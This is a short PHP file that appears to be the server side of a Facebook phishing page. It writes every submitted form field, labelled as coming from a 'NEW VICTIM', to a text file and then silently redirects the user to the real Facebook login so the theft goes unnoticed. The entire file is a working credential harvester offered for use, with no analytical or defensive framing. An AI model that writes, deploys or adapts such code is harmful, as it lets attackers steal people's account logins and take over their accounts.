<?php
// PHP Script to capture user credentials
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM (FACEBOOK) ----------\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect the user back to the official Facebook login
header("Location: https://www.facebook.com/login/");
exit;
?>
